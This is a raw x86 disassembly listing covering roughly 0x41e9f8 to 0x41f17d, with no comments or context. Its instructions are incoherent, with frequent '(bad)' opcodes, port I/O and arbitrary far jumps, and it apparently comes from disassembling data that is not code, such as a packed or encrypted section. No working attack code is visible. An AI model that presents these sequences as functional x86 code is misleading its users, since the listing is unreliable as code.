  41e9f8:	ins    DWORD PTR es:[edi],dx
  41e9f9:	sub    al,0x39
  41e9fb:	mov    edi,0x4dea378d
  41ea00:	and    al,0xfe
  41ea02:	rcr    DWORD PTR ss:[ecx],1
  41ea05:	jl     0x41ea7e
  41ea07:	or     DWORD PTR [edi],esp
  41ea09:	or     eax,DWORD PTR [eax+0x7e]
  41ea0c:	cmp    ebx,0x411708c6
  41ea12:	ret    0x5bb4
  41ea15:	loop   0x41ea75
  41ea17:	push   0x60
  41ea19:	addr16 sbb eax,0x18dd7fa0
  41ea1f:	int3   
  41ea20:	xchg   edx,eax
  41ea21:	in     eax,0x11
  41ea23:	sub    al,0x55
  41ea25:	aaa    
  41ea26:	push   edi
  41ea27:	jo     0x41ea86
  41ea29:	cmp    cl,dh
  41ea2b:	and    ebx,edi
  41ea2d:	dec    ecx
  41ea2e:	repz add al,0xf
  41ea31:	mov    ds:0x4ae54a39,eax
  41ea36:	arpl   WORD PTR [edi],bx
  41ea38:	or     bl,BYTE PTR [ebx+edi*1+0x33]
  41ea3c:	pop    ecx
  41ea3d:	repz push 0x285850c2
  41ea43:	nop
  41ea44:	add    eax,0xf1b5d908
  41ea49:	xor    bh,al
  41ea4b:	xor    dh,cl
  41ea4d:	push   ds
  41ea4e:	mov    ds:0xc0cd07df,eax
  41ea53:	add    ecx,ebp
  41ea55:	fdivr  QWORD PTR [ebx+0x6ef274ab]
  41ea5b:	jae    0x41ea72
  41ea5d:	das    
  41ea5e:	int    0xc
  41ea60:	mov    dh,0xb3
  41ea62:	out    dx,al
  41ea63:	sti    
  41ea64:	out    0x9b,al
  41ea66:	or     al,0x29
  41ea68:	inc    ebx
  41ea69:	mov    dl,0x2b
  41ea6b:	pop    es
  41ea6c:	shl    BYTE PTR [ecx+0x448e0f61],1
  41ea72:	fwait
  41ea73:	loope  0x41e9ff
  41ea75:	add    esp,eax
  41ea77:	hlt    
  41ea78:	sub    eax,0x200338ab
  41ea7d:	jmp    0x80756d02
  41ea82:	adc    al,0x7
  41ea84:	jb     0x41eaa8
  41ea86:	and    eax,0x57752b73
  41ea8b:	(bad)  
  41ea8c:	cmp    BYTE PTR [esi-0x46],bl
  41ea8f:	(bad)  
  41ea91:	mov    cs,edx
  41ea93:	test   BYTE PTR ds:[ebx-0x21],0x4a
  41ea98:	or     ah,cl
  41ea9a:	loope  0x41eb17
  41ea9c:	in     eax,0x53
  41ea9e:	loope  0x41ea46
  41eaa0:	jp     0x41eacf
  41eaa2:	mov    edi,0xcdf03444
  41eaa7:	xchg   DWORD PTR [edx-0x69],ebp
  41eaaa:	ror    edx,cl
  41eaac:	imul   eax,edi,0xffffffb0
  41eaaf:	xor    edi,0xfc40ca24
  41eab5:	cmp    eax,DWORD PTR [edi]
  41eab7:	and    BYTE PTR [eax],bl
  41eab9:	inc    eax
  41eaba:	mov    eax,ds:0x904461a1
  41eabf:	jmp    0xd2aeeed2
  41eac4:	add    al,0xbd
  41eac6:	jle    0x41ea49
  41eac8:	or     dh,BYTE PTR [ecx+0x3367d5b5]
  41eace:	adc    DWORD PTR [edi-0x7cf1140],esi
  41ead4:	and    BYTE PTR [edi+ecx*1],ah
  41ead7:	push   ebp
  41ead8:	ss idiv cl
  41eadb:	ins    BYTE PTR es:[edi],dx
  41eadc:	loope  0x41eb43
  41eade:	daa    
  41eadf:	pop    eax
  41eae0:	sbb    BYTE PTR [eax],al
  41eae2:	adc    al,0x96
  41eae4:	outs   dx,DWORD PTR ds:[esi]
  41eae5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eae6:	cmp    eax,0xf43decbf
  41eaeb:	push   esi
  41eaec:	mov    dh,BYTE PTR [ebx-0x3b]
  41eaef:	adc    edi,DWORD PTR [ebx-0x77271ae1]
  41eaf5:	(bad)  
  41eaf6:	out    0x8f,al
  41eaf8:	sti    
  41eaf9:	mov    edx,0xa1f79fc9
  41eafe:	cmp    DWORD PTR [edx],esp
  41eb00:	lea    eax,[edi+eiz*1]
  41eb03:	dec    ebp
  41eb04:	cmp    eax,0x3a023dc2
  41eb09:	inc    esp
  41eb0a:	jmp    0xbcb4:0x9689c27d
  41eb11:	xor    BYTE PTR [eax],cl
  41eb13:	jns    0x41eb63
  41eb15:	lahf   
  41eb16:	sbb    BYTE PTR [edi+0x17],bl
  41eb19:	out    dx,eax
  41eb1a:	add    eax,edi
  41eb1c:	daa    
  41eb1d:	inc    edx
  41eb1e:	call   0x22c:0xb4173eab
  41eb25:	add    dh,cl
  41eb27:	or     esi,DWORD PTR [ecx]
  41eb29:	inc    edi
  41eb2a:	pop    esp
  41eb2b:	mov    al,ds:0x324b4fb4
  41eb30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eb31:	cmp    DWORD PTR [ebx+0x4b],0xffffffbb
  41eb35:	fistp  WORD PTR [eax+edx*4-0x79]
  41eb39:	outs   dx,BYTE PTR ds:[esi]
  41eb3a:	sbb    BYTE PTR [ebp+edi*4+0x3b],al
  41eb3e:	xor    DWORD PTR [edx-0x61],eax
  41eb41:	xlat   BYTE PTR ds:[ebx]
  41eb42:	mov    eax,ds:0x3fc3e7de
  41eb47:	pop    edi
  41eb48:	(bad)  
  41eb49:	outs   dx,DWORD PTR ds:[esi]
  41eb4a:	scas   eax,DWORD PTR es:[edi]
  41eb4b:	mov    ebx,0x962c6d82
  41eb50:	js     0x41ebb5
  41eb52:	clc    
  41eb53:	mov    ecx,0xde87e636
  41eb58:	adc    bh,dl
  41eb5a:	pop    esi
  41eb5b:	popf   
  41eb5c:	in     al,dx
  41eb5d:	rcr    DWORD PTR [eax+eiz*1+0x3f],1
  41eb61:	call   0x7b55:0x4c7cb2a3
  41eb68:	mov    al,0x18
  41eb6a:	dec    esp
  41eb6b:	add    BYTE PTR [edx-0x44090fe2],cl
  41eb71:	es add al,0x23
  41eb74:	(bad)  [eax+0x51]
  41eb77:	aam    0x75
  41eb79:	xchg   DWORD PTR [ebp+eiz*4-0x33d605db],eax
  41eb80:	jo     0x41ebf2
  41eb82:	inc    edx
  41eb83:	xchg   DWORD PTR [eax-0x31d2aac4],edi
  41eb89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eb8a:	hlt    
  41eb8b:	mov    ebx,DWORD PTR [ecx+0x3020cc28]
  41eb91:	jge    0x41eb95
  41eb93:	pop    eax
  41eb94:	adc    BYTE PTR [ebx+0x66],ch
  41eb97:	inc    esi
  41eb98:	add    DWORD PTR [eax-0x301b3e29],ebp
  41eb9e:	into   
  41eb9f:	into   
  41eba0:	ror    BYTE PTR [edx+0x4a],cl
  41eba3:	test   DWORD PTR [eax-0x41],esi
  41eba6:	mov    fs:0xcb280704,eax
  41ebac:	mov    ch,0xe6
  41ebae:	cwde   
  41ebaf:	cmp    al,0x31
  41ebb1:	pop    ss
  41ebb2:	and    eax,0x650f989c
  41ebb7:	outs   dx,BYTE PTR ds:[esi]
  41ebb8:	dec    esp
  41ebb9:	div    eax
  41ebbb:	into   
  41ebbc:	mov    edx,0x18bf85c5
  41ebc1:	add    BYTE PTR ds:0x5a43f646,ah
  41ebc7:	test   eax,0x8286729e
  41ebcc:	pop    edx
  41ebcd:	test   BYTE PTR [ebx],bl
  41ebcf:	add    al,0x5
  41ebd1:	cld    
  41ebd2:	mov    ch,0x15
  41ebd4:	lea    esi,[eax+0x3d4f694a]
  41ebda:	icebp  
  41ebdb:	idiv   dh
  41ebdd:	stos   DWORD PTR es:[edi],eax
  41ebde:	sub    ah,dl
  41ebe0:	outs   dx,BYTE PTR ds:[esi]
  41ebe1:	sbb    eax,0xc0767889
  41ebe6:	test   BYTE PTR [eax+0x39beb52d],dh
  41ebec:	push   ss
  41ebed:	adc    al,0xfd
  41ebef:	xchg   edi,eax
  41ebf0:	test   BYTE PTR [bx+0xc],ah
  41ebf4:	jns    0x41eb99
  41ebf6:	and    bh,BYTE PTR [eax-0x73]
  41ebf9:	ret    0xdcab
  41ebfc:	adc    cl,BYTE PTR [edi+0x57]
  41ebff:	push   ebx
  41ec00:	pusha  
  41ec01:	data16 sbb ah,BYTE PTR [ebx+0x3114611d]
  41ec08:	das    
  41ec09:	adc    eax,0xde66f2ed
  41ec0e:	jne    0x41eba2
  41ec10:	arpl   WORD PTR [esp+esi*2+0x40b367f4],si
  41ec17:	cmp    ah,BYTE PTR [edi+0x4dd0cbd]
  41ec1d:	popf   
  41ec1e:	and    al,0xa8
  41ec20:	push   ecx
  41ec21:	or     al,0x23
  41ec23:	push   esp
  41ec24:	xor    BYTE PTR [ecx-0x176b4bc4],bl
  41ec2a:	add    BYTE PTR [edx],dh
  41ec2c:	mov    ds:0xee7992ff,eax
  41ec31:	les    edx,FWORD PTR [eax-0x226f3278]
  41ec37:	xlat   BYTE PTR es:[ebx]
  41ec39:	jmp    DWORD PTR [ebp-0x32036194]
  41ec3f:	test   al,0x7b
  41ec41:	inc    ebp
  41ec42:	mov    bh,0x31
  41ec44:	mov    bl,0xed
  41ec46:	or     esi,ecx
  41ec48:	or     al,0xb0
  41ec4a:	xor    eax,0xd5cc92ee
  41ec4f:	and    edx,DWORD PTR [edx-0x79820069]
  41ec55:	mov    ah,0xdf
  41ec57:	push   esp
  41ec58:	pop    es
  41ec59:	out    0xf9,eax
  41ec5b:	inc    ecx
  41ec5c:	cmc    
  41ec5d:	jb     0x41ec12
  41ec5f:	mov    BYTE PTR [eax+0x2c],ch
  41ec62:	aas    
  41ec63:	pop    ecx
  41ec64:	into   
  41ec65:	int3   
  41ec66:	mov    DWORD PTR [eax+ebp*8],edx
  41ec69:	loopne 0x41ec1c
  41ec6b:	sub    al,BYTE PTR [ebx]
  41ec6d:	rcr    DWORD PTR [esp+esi*8+0x2b],cl
  41ec71:	rcl    DWORD PTR [esi],0xa7
  41ec74:	push   0x3f
  41ec76:	add    BYTE PTR [esi],al
  41ec78:	mov    DWORD PTR [ebx],eax
  41ec7a:	jne    0x41ecb9
  41ec7c:	jmp    0x92ed:0x821055a8
  41ec83:	adc    ch,bh
  41ec85:	cmp    al,0xac
  41ec87:	jg     0x41ec75
  41ec89:	xchg   ebp,eax
  41ec8a:	ret    0x6759
  41ec8d:	sbb    BYTE PTR [ebx+esi*8+0x59],bl
  41ec91:	jge    0x41ecf1
  41ec93:	mov    cl,0x89
  41ec95:	int3   
  41ec96:	pushf  
  41ec97:	add    ebx,DWORD PTR [ebx]
  41ec99:	add    al,0xac
  41ec9b:	popa   
  41ec9c:	rol    BYTE PTR [ebp+0x14],1
  41ec9f:	jecxz  0x41ec57
  41eca1:	jb     0x41ec7d
  41eca3:	dec    edx
  41eca4:	fwait
  41eca5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eca6:	lock leave 
  41eca8:	icebp  
  41eca9:	dec    eax
  41ecaa:	or     DWORD PTR [ecx-0x47d7fdee],eax
  41ecb0:	mov    BYTE PTR [edx],cl
  41ecb2:	jl     0x41ec76
  41ecb4:	nop
  41ecb5:	fsub   DWORD PTR [edi-0x1]
  41ecb8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ecb9:	or     eax,0x56aff3f0
  41ecbe:	mov    bh,0x4
  41ecc0:	pop    es
  41ecc1:	cld    
  41ecc2:	adc    eax,0x371b89e
  41ecc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ecc8:	fcom   DWORD PTR [edi-0x57cd5f49]
  41ecce:	ficom  DWORD PTR [edx+0x4cd1f381]
  41ecd4:	xor    esp,DWORD PTR [edi]
  41ecd6:	xchg   esi,eax
  41ecd7:	call   0x9e5314de
  41ecdc:	rcr    esp,1
  41ecde:	jmp    0x41ecf8
  41ece0:	jo     0x41ed45
  41ece2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ece3:	mov    edi,0xf7870e4c
  41ece8:	lock sbb BYTE PTR ds:0xa2f3a51b,bh
  41ecef:	xchg   ah,ah
  41ecf1:	shr    DWORD PTR [ebp+eax*8+0x48],0xb1
  41ecf6:	or     al,0xdd
  41ecf8:	(bad)  [eax+ebp*1]
  41ecfb:	xchg   ecx,eax
  41ecfc:	mov    WORD PTR [esi-0x38ca2846],ss
  41ed02:	mov    al,ds:0x43a6d5e7
  41ed07:	pop    ebp
  41ed08:	retf   0x4b8c
  41ed0b:	dec    ecx
  41ed0c:	es and dl,dh
  41ed0f:	rol    esi,cl
  41ed11:	jle    0x41ecf1
  41ed13:	sbb    BYTE PTR [ebx*1+0x1d8fa7c6],ch
  41ed1a:	ror    DWORD PTR [ecx],cl
  41ed1c:	cdq    
  41ed1d:	mov    eax,0x70b0cea
  41ed22:	mov    ebp,0x4437d61b
  41ed27:	fisub  WORD PTR [edi+0x316512e6]
  41ed2d:	fbstp  TBYTE PTR [ebx-0x42]
  41ed30:	sar    cl,1
  41ed32:	out    dx,eax
  41ed33:	sti    
  41ed34:	jae    0x41eceb
  41ed36:	fwait
  41ed37:	imul   eax,DWORD PTR [edx+ecx*1+0xc],0x342bc52d
  41ed3f:	rcl    BYTE PTR [eax+0x15a82b94],0x59
  41ed46:	and    dh,BYTE PTR [esi*1-0x5e5b044a]
  41ed4d:	pop    ss
  41ed4e:	les    ecx,FWORD PTR [ebp+0x64]
  41ed51:	stc    
  41ed52:	scas   al,BYTE PTR es:[edi]
  41ed53:	jbe    0x41edcf
  41ed55:	dec    ebx
  41ed56:	mov    ebx,0x88a96f61
  41ed5b:	fimul  DWORD PTR [ecx+0x6d3e12cc]
  41ed61:	loopne 0x41ed17
  41ed63:	jl     0x41ed99
  41ed65:	fucomi st,st(4)
  41ed67:	int3   
  41ed68:	shl    BYTE PTR [ebp-0x34],0x5b
  41ed6c:	test   BYTE PTR [esi],ch
  41ed6e:	pop    es
  41ed6f:	push   es
  41ed70:	add    esi,DWORD PTR [esi+0x47fe9caf]
  41ed76:	cmp    ah,BYTE PTR ds:0x526cd303
  41ed7c:	push   ebp
  41ed7e:	sbb    edi,DWORD PTR [edi-0x36]
  41ed81:	add    esi,DWORD PTR [ebp+0x65]
  41ed84:	mov    ds:0x4f197f5c,eax
  41ed89:	pop    ss
  41ed8a:	fsubr  QWORD PTR [ecx]
  41ed8c:	les    esp,FWORD PTR [ecx-0x6]
  41ed8f:	outs   dx,DWORD PTR ds:[esi]
  41ed90:	mov    WORD PTR [ecx-0x46b1e3dd],cs
  41ed96:	(bad)  
  41ed97:	(bad)  
  41ed98:	or     eax,0xf9a309de
  41ed9d:	sahf   
  41ed9e:	or     DWORD PTR [ecx-0x2bb805b6],0x59653b05
  41eda8:	inc    ecx
  41eda9:	jno    0x41ed43
  41edab:	inc    edi
  41edac:	inc    edi
  41edad:	mov    ebx,0x4109d166
  41edb2:	test   DWORD PTR [edx],esp
  41edb4:	fldenv [edi-0x25]
  41edb7:	es iret 
  41edb9:	fistp  QWORD PTR [edi-0xd]
  41edbc:	mov    ebp,0x1d048117
  41edc1:	cs into 
  41edc3:	mov    dh,0xe2
  41edc5:	sti    
  41edc6:	les    edx,FWORD PTR [edi+0x3c]
  41edc9:	dec    edx
  41edca:	jb     0x41ed93
  41edcc:	xchg   edx,eax
  41edcd:	push   edi
  41edce:	js     0x41ede1
  41edd0:	dec    eax
  41edd1:	lods   al,BYTE PTR ds:[esi]
  41edd2:	imul   edi,edx,0xbf9672ac
  41edd8:	aas    
  41edd9:	neg    DWORD PTR [eax]
  41eddb:	push   ecx
  41eddc:	adc    al,BYTE PTR [ebx+ebp*8-0x2ce543cd]
  41ede3:	add    ah,BYTE PTR [esi]
  41ede5:	leave  
  41ede6:	ret    
  41ede7:	aam    0x84
  41ede9:	push   esp
  41edea:	add    eax,0x715564e3
  41edef:	jge    0x41eda2
  41edf1:	mov    bl,0xd8
  41edf3:	xor    al,0x6f
  41edf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41edf6:	mov    bl,bh
  41edf8:	lock push ecx
  41edfa:	mov    dl,0x76
  41edfc:	pop    ebx
  41edfd:	cmp    dl,BYTE PTR [ebx]
  41edff:	inc    ebp
  41ee00:	ret    
  41ee01:	inc    eax
  41ee02:	or     edx,DWORD PTR [ebx+0x57]
  41ee05:	or     eax,0x9ffcd15
  41ee0a:	je     0x41ed8e
  41ee0c:	mov    ebp,0x105b7442
  41ee11:	loop   0x41ee21
  41ee13:	sub    eax,0x5fe3ee9
  41ee18:	inc    esp
  41ee19:	aaa    
  41ee1a:	lods   al,BYTE PTR ds:[esi]
  41ee1b:	mov    al,ds:0x42c6df30
  41ee20:	(bad)  
  41ee21:	push   edx
  41ee22:	push   cs
  41ee23:	hlt    
  41ee24:	dec    ebx
  41ee25:	and    eax,0x60a7506
  41ee2a:	mov    ch,0x42
  41ee2c:	hlt    
  41ee2d:	rcl    DWORD PTR ds:0x47ae7c48,1
  41ee33:	fmul   QWORD PTR [ecx-0x69118dc5]
  41ee39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee3a:	out    0x39,al
  41ee3c:	mov    DWORD PTR [edx-0x22012f17],edx
  41ee42:	inc    eax
  41ee43:	mov    ?,WORD PTR [esp+ebp*4]
  41ee46:	jbe    0x41eec2
  41ee48:	cmp    ch,BYTE PTR [ebx+0x45671562]
  41ee4e:	sahf   
  41ee4f:	adc    ch,cl
  41ee51:	or     DWORD PTR ds:0x87276f93,ebp
  41ee57:	push   esp
  41ee58:	push   edx
  41ee59:	push   eax
  41ee5a:	fldcw  WORD PTR [eax-0x7b]
  41ee5d:	test   bl,0xea
  41ee60:	mov    dh,0x3e
  41ee62:	mov    ah,0xb7
  41ee64:	push   ebx
  41ee65:	or     eax,0x21828467
  41ee6a:	pop    esi
  41ee6b:	sbb    cl,dh
  41ee6d:	into   
  41ee6e:	adc    dh,BYTE PTR [eax]
  41ee70:	push   ebx
  41ee71:	outs   dx,DWORD PTR ds:[esi]
  41ee72:	aad    0x12
  41ee74:	mov    ecx,0xd77839cb
  41ee79:	ret    
  41ee7a:	inc    ebp
  41ee7b:	mov    ?,WORD PTR [esi-0x165f5d0e]
  41ee81:	mov    dl,0x47
  41ee83:	es gs stos DWORD PTR es:[edi],eax
  41ee86:	xchg   edi,eax
  41ee87:	push   cs
  41ee88:	push   es
  41ee89:	xchg   ecx,eax
  41ee8a:	outs   dx,BYTE PTR ds:[esi]
  41ee8b:	or     eax,0xe0bca999
  41ee90:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee91:	inc    ebx
  41ee92:	popf   
  41ee93:	pop    edx
  41ee94:	push   0xffffff91
  41ee96:	inc    esi
  41ee97:	int    0xef
  41ee99:	pop    ecx
  41ee9a:	ds jb  0x41eee7
  41ee9d:	lahf   
  41ee9e:	addr16 cmp eax,0x84284503
  41eea4:	ins    BYTE PTR es:[edi],dx
  41eea5:	adc    al,BYTE PTR [esi-0x3cf2cc90]
  41eeab:	jno    0x41eed1
  41eead:	popf   
  41eeae:	sub    al,0xf6
  41eeb0:	mov    eax,?
  41eeb2:	ss call 0x777f:0x2b3c41eb
  41eeba:	sbb    ax,0xa947
  41eebe:	push   edi
  41eebf:	or     DWORD PTR [edx+0x3],0xe36aeec4
  41eec6:	rcr    DWORD PTR [ebp+edx*2+0x62],cl
  41eeca:	shr    edx,0xa4
  41eecd:	mul    bh
  41eecf:	ret    0xc29e
  41eed2:	push   ecx
  41eed3:	push   esp
  41eed4:	adc    dl,BYTE PTR [esp+esi*4]
  41eed7:	fwait
  41eed8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eed9:	sti    
  41eeda:	sub    ebx,DWORD PTR [ebp+0xc858063]
  41eee0:	jmp    0x108c:0xa851dd57
  41eee7:	call   0xe242:0xdd94427e
  41eeee:	xlat   BYTE PTR ds:[ebx]
  41eeef:	jmp    0xb7ffb277
  41eef4:	push   edx
  41eef5:	ins    BYTE PTR es:[edi],dx
  41eef6:	jmp    0x928b:0xaf01a4bf
  41eefd:	stc    
  41eefe:	call   0x969b:0xf470d5f3
  41ef05:	jle    0x41eee3
  41ef07:	pop    ecx
  41ef08:	cld    
  41ef09:	mov    bh,0xb5
  41ef0b:	sbb    ah,dh
  41ef0d:	popa   
  41ef0e:	push   DWORD PTR [ecx+0x6f119e2c]
  41ef14:	scas   eax,DWORD PTR es:[edi]
  41ef15:	into   
  41ef16:	jge    0x41eef0
  41ef18:	mov    BYTE PTR [ebp-0x6f],cl
  41ef1b:	dec    ebp
  41ef1c:	test   DWORD PTR [esi],0x442fb60f
  41ef22:	sub    ebx,DWORD PTR [ebx+0x272fb430]
  41ef28:	cmc    
  41ef29:	jns    0x41ef09
  41ef2b:	and    BYTE PTR [ebx+0x79],al
  41ef2e:	pop    esi
  41ef2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef30:	scas   eax,DWORD PTR es:[edi]
  41ef31:	ins    DWORD PTR es:[edi],dx
  41ef32:	and    DWORD PTR [edx+edx*4],esp
  41ef35:	push   es
  41ef36:	sti    
  41ef37:	sub    bh,ah
  41ef39:	xor    ecx,DWORD PTR [edx+0x2b]
  41ef3c:	loopne 0x41ef06
  41ef3e:	pop    edx
  41ef3f:	data16 rcr BYTE PTR ds:0x1db9bd09,cl
  41ef46:	add    edx,DWORD PTR [eax-0x1f33b0fb]
  41ef4c:	popf   
  41ef4d:	das    
  41ef4e:	push   cs
  41ef4f:	jge    0x41eee0
  41ef51:	call   DWORD PTR [edi+0x5b]
  41ef54:	fs fs and al,0x85
  41ef58:	inc    eax
  41ef59:	xor    BYTE PTR [esi-0x28],ch
  41ef5c:	mov    ch,0x53
  41ef5e:	push   es
  41ef5f:	dec    edi
  41ef60:	in     al,0x18
  41ef62:	mov    dh,0x34
  41ef64:	sbb    al,0xf
  41ef66:	rcl    cl,0x5d
  41ef69:	push   esp
  41ef6a:	cmp    eax,0x3a61cac7
  41ef6f:	out    0x86,al
  41ef71:	adc    al,0xcd
  41ef73:	setg   bl
  41ef76:	pop    ss
  41ef77:	fldenv ss:[eax]
  41ef7a:	scas   al,BYTE PTR es:[edi]
  41ef7b:	gs cwde 
  41ef7d:	inc    edx
  41ef7e:	xor    BYTE PTR [ebp-0x61],bh
  41ef81:	or     al,0xb5
  41ef83:	aam    0x59
  41ef85:	call   0x35d9:0x6ca8518e
  41ef8c:	ins    DWORD PTR es:[edi],dx
  41ef8d:	inc    ecx
  41ef8e:	sub    bl,dh
  41ef90:	xor    al,0x18
  41ef92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef93:	pushf  
  41ef94:	jns    0x41ef47
  41ef96:	xchg   ebx,eax
  41ef97:	rol    DWORD PTR [eax+0x324a7916],0x64
  41ef9e:	cmp    DWORD PTR [ebp-0x3a],edx
  41efa1:	popf   
  41efa2:	jae    0x41f019
  41efa4:	jecxz  0x41ef9a
  41efa6:	jns    0x41efb5
  41efa8:	push   es
  41efa9:	inc    eax
  41efaa:	enter  0xc443,0x89
  41efae:	les    esi,FWORD PTR [edx+edi*2]
  41efb1:	sub    al,0xfa
  41efb3:	add    bl,BYTE PTR [ecx+0x316646ad]
  41efb9:	push   0x8b305672
  41efbe:	fisttp DWORD PTR [ecx+ebx*4-0x6013d899]
  41efc5:	rcr    ch,1
  41efc7:	and    cl,0xfe
  41efca:	xchg   esi,eax
  41efcb:	xchg   esi,eax
  41efcc:	cmp    ecx,DWORD PTR [eax]
  41efce:	mov    al,ds:0x6f3b745e
  41efd3:	mov    ds:0xbe9545f3,eax
  41efd8:	sub    BYTE PTR [edi+0x16],bh
  41efdb:	mov    gs:0x18abaf01,eax
  41efe1:	and    ebp,DWORD PTR fs:[esi+0x5d]
  41efe5:	(bad)  
  41efe6:	in     al,0x22
  41efe8:	ins    BYTE PTR es:[edi],dx
  41efe9:	rcl    BYTE PTR [edi],0x82
  41efec:	push   es
  41efed:	out    dx,al
  41efee:	aas    
  41efef:	xlat   BYTE PTR ds:[ebx]
  41eff0:	lds    ebx,FWORD PTR [ebp-0x4c]
  41eff3:	lods   eax,DWORD PTR ds:[esi]
  41eff4:	and    BYTE PTR [ecx],dh
  41eff6:	adc    ch,BYTE PTR [esi+0x58b23890]
  41effc:	stos   BYTE PTR es:[edi],al
  41effd:	in     eax,dx
  41effe:	ret    
  41efff:	cmp    al,0x3e
  41f001:	cmp    dl,dl
  41f003:	sbb    dl,BYTE PTR [ecx-0x7bc2ebb0]
  41f009:	retf   0x925b
  41f00c:	add    al,0x67
  41f00e:	push   0xffffffa3
  41f010:	scas   eax,DWORD PTR es:[edi]
  41f011:	mov    al,ds:0x17f91c3
  41f016:	dec    esi
  41f017:	add    eax,0x1521eb16
  41f01c:	xchg   bl,dl
  41f01e:	ret    
  41f01f:	repnz fild WORD PTR [ebx]
  41f022:	push   ds
  41f023:	mov    al,ds:0xae93752c
  41f028:	or     DWORD PTR [ebx-0x77d00245],ecx
  41f02e:	and    ebx,edi
  41f030:	cmp    cl,BYTE PTR [ebx-0x78]
  41f033:	aam    0x9c
  41f035:	mov    dh,0xfe
  41f037:	or     al,BYTE PTR [ecx+0x24]
  41f03a:	(bad)  
  41f03d:	mov    bh,0x36
  41f03f:	pop    ds
  41f040:	cmc    
  41f041:	imul   eax,edx,0xffffff97
  41f044:	data16 js 0x41f02f
  41f047:	mov    ch,0xe0
  41f049:	mov    ds:0xb212bfc7,eax
  41f04e:	jbe    0x41f0a1
  41f050:	cmp    dl,BYTE PTR [ebp+0x341d813f]
  41f056:	repnz aas 
  41f058:	loope  0x41efdf
  41f05a:	jns    0x41f056
  41f05c:	cmp    cl,bl
  41f05e:	sbb    ch,BYTE PTR [edi-0x3b]
  41f061:	and    eax,0xc2a5897b
  41f066:	shl    BYTE PTR [esi+0x50498f22],cl
  41f06c:	adc    esp,DWORD PTR [ebx-0x7576cc04]
  41f072:	xchg   edi,eax
  41f073:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f074:	and    cl,cl
  41f076:	test   edx,0xda499f7f
  41f07c:	jecxz  0x41f0bf
  41f07e:	jae    0x41f037
  41f080:	add    esp,DWORD PTR [esi]
  41f082:	lahf   
  41f083:	inc    ecx
  41f084:	pop    ebp
  41f085:	lock add eax,0x5808c88d
  41f08b:	xor    edx,DWORD PTR [ebp+0x4e2e5dac]
  41f091:	fnstsw WORD PTR [ebx]
  41f093:	add    BYTE PTR [ebp+edx*2+0x690e1ecd],al
  41f09a:	cmp    al,0x99
  41f09c:	jb     0x41f08d
  41f09e:	cdq    
  41f09f:	or     eax,0x40408190
  41f0a4:	jae    0x41f0cd
  41f0a6:	cli    
  41f0a7:	sub    BYTE PTR [ecx-0x3910d6a5],0xcd
  41f0ae:	cld    
  41f0af:	(bad)  
  41f0b0:	out    dx,eax
  41f0b1:	dec    esp
  41f0b2:	jnp    0x41f0b5
  41f0b4:	pop    esp
  41f0b5:	and    dh,BYTE PTR [esi+0x46]
  41f0b8:	sub    DWORD PTR [esi-0x76b154e7],0x60
  41f0bf:	and    DWORD PTR [edi+0x59],esi
  41f0c2:	or     DWORD PTR [ebx+0x17],0x38
  41f0c6:	in     al,0x7f
  41f0c8:	and    BYTE PTR [ecx+edi*1+0x5c82e9c6],dh
  41f0cf:	sbb    bl,al
  41f0d1:	test   al,0xc7
  41f0d3:	mov    esi,0xe5c25995
  41f0d8:	xchg   edx,eax
  41f0d9:	xor    al,0x51
  41f0db:	xor    eax,edx
  41f0dd:	cmp    BYTE PTR ds:0x2bd77d0b,cl
  41f0e3:	ficomp WORD PTR [edi-0x4a155ca8]
  41f0e9:	outs   dx,BYTE PTR ds:[esi]
  41f0ea:	and    al,0xb5
  41f0ec:	arpl   di,bp
  41f0ee:	ja     0x41f156
  41f0f0:	into   
  41f0f1:	call   0xc95:0x31db18a7
  41f0f8:	push   0x963180c9
  41f0fd:	loop   0x41f15d
  41f0ff:	pop    ebx
  41f100:	sti    
  41f101:	sbb    al,0xb8
  41f103:	aam    0xc6
  41f105:	pop    esp
  41f106:	ss out dx,al
  41f108:	mov    ds:0xed2f1fc4,al
  41f10d:	repnz sbb BYTE PTR [ebx+0x341657c6],cl
  41f114:	dec    ecx
  41f115:	stos   BYTE PTR es:[edi],al
  41f116:	push   ss
  41f117:	aad    0xf
  41f119:	push   ds
  41f11a:	and    ecx,DWORD PTR [edi-0x44]
  41f11d:	sub    ebx,DWORD PTR [ecx]
  41f11f:	fstp   TBYTE PTR [edi]
  41f121:	pop    ecx
  41f122:	lods   al,BYTE PTR ds:[esi]
  41f123:	lock fsubr DWORD PTR ds:0x391a4712
  41f12a:	add    al,0xb3
  41f12c:	lods   eax,DWORD PTR ds:[esi]
  41f12d:	and    ebp,DWORD PTR [ecx+0x2ca7ccce]
  41f133:	(bad)  
  41f134:	repz mov ebx,0x445c91fd
  41f13a:	fwait
  41f13b:	(bad)  
  41f13c:	inc    ebx
  41f13d:	add    BYTE PTR [ebx+0x5],bl
  41f140:	(bad)  [eax-0x68e84fb9]
  41f146:	add    BYTE PTR [esi],bl
  41f148:	push   0x8
  41f14a:	es sbb eax,0x5eb411ea
  41f150:	xchg   esp,eax
  41f151:	xor    eax,0x79d40730
  41f156:	dec    BYTE PTR [ebp-0x6c]
  41f159:	popf   
  41f15a:	adc    BYTE PTR [ebx],0xd0
  41f15d:	scas   al,BYTE PTR es:[edi]
  41f15e:	xor    BYTE PTR [ebx-0x21],dh
  41f161:	fisttp WORD PTR [edi]
  41f163:	cwde   
  41f164:	loop   0x41f1bf
  41f166:	and    al,0xf6
  41f168:	or     edx,DWORD PTR ds:0x695e70b5
  41f16e:	xor    al,0xc
  41f170:	test   BYTE PTR [esi+0x46],al
  41f173:	sti    
  41f174:	pushf  
  41f175:	shr    cl,cl
  41f177:	pop    ds
  41f178:	mov    ds:0x4749295e,al
  41f17d:	inc    esp
